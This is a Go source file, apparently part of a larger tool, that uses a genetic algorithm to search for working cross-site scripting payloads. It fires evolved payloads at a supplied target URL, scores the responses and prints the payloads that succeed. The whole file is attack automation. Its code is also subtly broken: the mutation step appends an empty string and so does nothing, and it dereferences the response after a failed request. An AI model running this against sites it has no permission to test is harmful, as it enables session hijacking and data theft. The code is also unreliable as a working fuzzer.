package main

import (
	"fmt"
	"github.com/mpvl/unique"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"sort"
)

const randomCircles = 20
const epoch = 100

func crossover(xssAttacks []xssAttack) []xssAttack {

	for i := 0; i < randomCircles; i++ {
		a1 := rand.Intn(len(xssAttacks))
		a2 := rand.Intn(len(xssAttacks))
		module := rand.Intn(6)

		buff := xssAttacks[a1].attack[module]
		xssAttacks[a1].attack[module] = xssAttacks[a2].attack[module]
		xssAttacks[a2].attack[module] = buff
	}

	return xssAttacks
}

func mutation(xssAttacks []xssAttack) []xssAttack {
	for i := 0; i < randomCircles; i++ {

		idx := rand.Intn(len(xssAttacks))
		module := rand.Intn(6)

		xssAttacks[idx].attack[module] = xssAttacks[idx].attack[module] + ""

	}

	return xssAttacks
}

func GA(attackUrl string, xssAttacks []xssAttack) {

	for i := 0; i < epoch; i++ {

		for j := 0; j < len(xssAttacks); j++ {

			xss := xssAttacks[j].attack[0] + xssAttacks[j].attack[1] + xssAttacks[j].attack[2] +
				xssAttacks[j].attack[3] + xssAttacks[j].attack[4] + xssAttacks[j].attack[5]

			xssVector := attackUrl + url.QueryEscape(xss)

			resp, err := request(xssVector)
			if err != nil {
				log.Println(err)
			}

			if resp.StatusCode == http.StatusOK {
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					log.Fatal(err)
				}
				bodyString := string(bodyBytes)

				xssAttacks[j].fitFunction = fitFunction(attackUrl, bodyString, xss)
			}

			err = resp.Body.Close()
			if err != nil {
				log.Println(err)
			}
		}

		sort.SliceStable(xssAttacks, func(i, j int) bool {
			return xssAttacks[i].fitFunction > xssAttacks[j].fitFunction
		})

		newPopulation := xssAttacks // selection

		newPopulation = crossover(newPopulation)
		newPopulation = mutation(newPopulation)

		xssAttacks = newPopulation

		avgFitFunction := sum(xssAttacks) / float64(len(xssAttacks))
		fmt.Println("Epoch: ", i, "FitFunction: ", avgFitFunction)
	}

	unique.Strings(&xssFound)
	for _, v := range xssFound {
		fmt.Println("Working XSS [+]: ", v)
	}
}
